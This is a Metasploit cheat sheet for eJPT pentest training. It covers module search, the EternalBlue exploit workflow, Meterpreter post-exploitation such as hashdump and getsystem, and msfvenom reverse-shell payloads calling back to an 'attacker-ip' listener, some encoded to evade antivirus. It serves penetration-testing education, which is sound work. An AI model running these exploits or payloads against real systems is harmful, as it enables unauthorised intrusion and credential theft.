# Metasploit Framework Cheat Sheet

**Metasploit** is the exploitation framework used throughout eJPT's host/network pentest module to search for, configure, and launch exploits, then manage post-exploitation sessions from a single console. This document covers `msfconsole` workflow, module selection, Meterpreter basics, and `msfvenom` payload generation.

---

## Table of Contents

1. [Framework Basics](#1-framework-basics)
2. [Searching & Selecting Modules](#2-searching--selecting-modules)
3. [Setting Options & Running](#3-setting-options--running)
4. [Meterpreter Basics](#4-meterpreter-basics)
5. [msfvenom Payload Generation](#5-msfvenom-payload-generation)
6. [Post-Exploitation Modules](#6-post-exploitation-modules)
7. [Practical eJPT Workflow](#7-practical-ejpt-workflow)
8. [Quick Command Reference](#8-quick-command-reference)

---

## 1. Framework Basics

Starting the console, keeping engagements organized in workspaces, and confirming the database backend is actually connected before relying on any of its caching features.

```bash
msfconsole                    # Launch the framework console
msfconsole -q                 # Quiet launch (skip the banner)

# Workspaces — isolate hosts/loot/creds per engagement or per target
workspace                     # List existing workspaces
workspace -a client-a-engagement   # Create and switch to a new workspace
workspace client-a-engagement      # Switch to an existing workspace

db_status                     # Confirm PostgreSQL database connectivity
```

> If `db_status` reports no database connection, host/service data won't be cached and commands like `hosts`, `services`, and `creds` will come back empty — run `msfdb init` (or `service postgresql start` + `db_reinit`) before starting real work.

---

## 2. Searching & Selecting Modules

Metasploit organizes everything into module types; knowing which type you need narrows the search fast.

| Module type | Purpose |
|---|---|
| `exploit` | Code that actively triggers a vulnerability |
| `auxiliary` | Scanners, fuzzers, DoS, login brute-forcers — no payload delivery |
| `post` | Runs against an already-established session (loot, privesc, pivoting) |
| `payload` | The code delivered/executed by an exploit (shell, Meterpreter, etc.) |
| `encoder` | Obfuscates a payload to dodge signature-based detection |
| `nop` | No-op sled generator, used in some buffer-overflow exploits |

```bash
search ms17-010                        # Search by name/CVE/reference
search type:exploit platform:windows smb
search cve:2021-34527                  # Search by CVE ID directly

use exploit/windows/smb/ms17_010_eternalblue   # Select a module by full path
use 0                                  # Or select by index from the last search results

info                                   # Full details on the currently selected module
```

---

## 3. Setting Options & Running

Every module exposes a set of options — some required, some optional — that must be configured before it will run.

```bash
show options                  # List all options for the selected module (Required column matters)
show payloads                 # List payloads compatible with the current exploit
show targets                  # List specific OS/service-version targets the exploit supports

set RHOSTS target-ip          # Target host(s) — accepts a range or a file with 'file:targets.txt'
set RPORT 445                 # Target port (if non-default)
set LHOST attacker-ip         # Your IP — for reverse payload callback
set LPORT 4444                # Your listener port
set PAYLOAD windows/x64/meterpreter/reverse_tcp

setg RHOSTS target-ip         # Set an option globally (persists across module switches)

check                         # Ask the module to verify the target is vulnerable without exploiting
run                            # Launch (equivalent to 'exploit')
exploit -j                     # Run as a background job (don't block the console)
```

> Always run `check` before `run` when the module supports it — it confirms exploitability without the risk/noise of a failed exploitation attempt, and saves time against a target that was never vulnerable to begin with.

---

## 4. Meterpreter Basics

The advanced payload that gives an interactive, in-memory post-exploitation shell once an exploit succeeds — commands that go beyond a plain OS shell.

```bash
sysinfo                       # Target OS, hostname, architecture
getuid                        # Current user context

ps                            # List running processes
migrate <PID>                 # Move Meterpreter into another process (stability / privilege)

hashdump                      # Dump local SAM hashes (requires SYSTEM/admin)
getsystem                     # Attempt automated privilege escalation to SYSTEM (Windows)

background                    # Send the current session to the background, return to msfconsole
sessions -l                   # List all active sessions
sessions -i 1                 # Interact with session 1
sessions -k 1                 # Kill session 1
```

> **Migrate before doing anything noisy.** The process an exploit lands in (e.g. a vulnerable service) can crash or be restarted, killing the session — migrating into a stable process like `explorer.exe` early preserves access.

---

## 5. msfvenom Payload Generation

Standalone tool for generating payloads outside of an active exploit — for delivering via an uploaded file, a phishing attachment, or manual placement where Metasploit's exploit modules don't apply. Pair this with `netcat-reverse-shell-cheatsheet-professional.md` for the listener/catching side when not using a Meterpreter handler.

```bash
# Windows reverse shell (.exe)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=attacker-ip LPORT=4444 -f exe -o shell.exe

# Linux reverse shell (ELF)
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=attacker-ip LPORT=4444 -f elf -o shell.elf

# PHP web shell payload
msfvenom -p php/meterpreter/reverse_tcp LHOST=attacker-ip LPORT=4444 -f raw -o shell.php

# List available formats / payloads / encoders
msfvenom --list formats
msfvenom --list payloads
msfvenom --list encoders

# Encode to reduce signature detection (rarely sufficient alone against modern AV)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=attacker-ip LPORT=4444 -e x86/shikata_ga_nai -i 3 -f exe -o shell_enc.exe
```

Catch the resulting payload with a Metasploit handler:

```bash
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST attacker-ip
set LPORT 4444
run
```

> `-f` sets the output format (`exe`, `elf`, `raw`, `war`, `psh` for PowerShell, etc.) — match it to what the target will actually execute. A raw PHP/ASP payload dropped through a web upload vulnerability doesn't need a Windows PE wrapper.

---

## 6. Post-Exploitation Modules

Once a session exists, `post/` modules automate recon and privilege escalation instead of running everything manually inside Meterpreter.

```bash
# Background the active session first, then from msfconsole:
use post/multi/recon/local_exploit_suggester
set SESSION 1
run                            # Suggests local privesc exploits based on OS/patch level

use post/windows/gather/hashdump
set SESSION 1
run

use post/windows/gather/enum_logged_on_users
use post/windows/gather/credentials/credential_collector
use post/linux/gather/enum_system
```

| Post module | Purpose |
|---|---|
| `post/multi/recon/local_exploit_suggester` | Cross-references OS/patch info against known local privesc exploits |
| `post/windows/gather/hashdump` | SAM hash dump via a session (no admin shell interaction needed) |
| `post/windows/gather/enum_shares` | Enumerate accessible shares from the compromised host |
| `post/linux/gather/enum_configs` | Pull configuration files of interest from a Linux target |

> For manual (non-Metasploit) privilege escalation techniques on either OS, see `linux-windows-pentest-cheatsheet-professional.md`.

---

## 7. Practical eJPT Workflow

A worked example using the classic MS17-010/EternalBlue path — the same vulnerability class covered from the SMB-enumeration side in `smb-windows-enumeration-cheatsheet-professional.md` section 7.

```bash
# 1. Confirm the vulnerability exists (from nmap or an auxiliary scanner)
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS target-ip
run

# 2. Select and configure the exploit
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS target-ip
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST attacker-ip
check
run

# 3. Once a Meterpreter session opens, stabilize and enumerate
sysinfo
getuid
migrate <stable-PID>

# 4. Privesc / credential harvesting
run post/multi/recon/local_exploit_suggester
hashdump

# 5. Background and move to the next host, or pivot from here
background
sessions -l
```

> This end-to-end flow (verify → exploit → stabilize → loot) is the pattern to repeat per host during an eJPT practical — enumerate first with `nmap-cheatsheet-professional.md`, confirm the specific vulnerability, then reach for Metasploit only once a target module is identified.

---

## 8. Quick Command Reference

A single-page lookup for every command covered above.

| Need | Command |
|---|---|
| New workspace | `workspace -a name` |
| Check DB connectivity | `db_status` |
| Search modules | `search ms17-010` |
| Select a module | `use exploit/windows/smb/ms17_010_eternalblue` |
| Show required options | `show options` |
| Set target/listener | `set RHOSTS ip` / `set LHOST ip` / `set LPORT port` |
| Verify without exploiting | `check` |
| Run the module | `run` |
| List/interact with sessions | `sessions -l` / `sessions -i 1` |
| Meterpreter user/host info | `getuid` / `sysinfo` |
| Migrate process | `migrate <PID>` |
| Dump local hashes | `hashdump` |
| Generate Windows payload | `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ip LPORT=4444 -f exe -o shell.exe` |
| Catch a standalone payload | `use exploit/multi/handler` |
| Local privesc suggestions | `use post/multi/recon/local_exploit_suggester` |

---

*Prepared as a reference for the eJPT host/network pentest module. All techniques should only be used within written authorization (scope/RoE).*
